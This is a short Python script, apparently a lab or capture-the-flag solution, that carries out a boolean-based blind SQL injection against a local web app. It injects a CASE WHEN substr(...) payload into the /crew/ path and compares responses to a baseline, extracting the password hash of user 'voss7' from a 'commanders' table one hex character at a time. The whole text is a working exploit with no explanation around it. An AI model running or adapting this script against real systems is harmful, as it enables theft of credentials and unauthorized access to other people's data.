import requests
import string

URL = "http://localhost:3000"
charset = string.hexdigits.lower()

def extract_hash(username):
    password_hash = ""
    
    baseline = requests.get(f"{URL}/crew/id").text
    
    for position in range(1, 65):
        found = False
        
        for char in charset:
            payload = f"(CASE WHEN substr((SELECT password_hash FROM commanders WHERE username='{username}'),{position},1)='{char}' THEN id ELSE username END)"
            
            try:
                r = requests.get(f"{URL}/crew/{payload}", timeout=5)
                
                if r.text == baseline:
                    password_hash += char
                    print(f"[+] Position {position}: {char} -> Hash so far: {password_hash}")
                    found = True
                    break
            except Exception as e:
                print(f"[-] Error: {e}")
                continue
        
        if not found:
            print(f"[-] Could not find character at position {position}")
            break
    
    return password_hash


print("[*] Extracting voss7's password hash via SQL injection...")
hash_voss7 = extract_hash("voss7")
print(f"\n[+] Final hash: {hash_voss7}")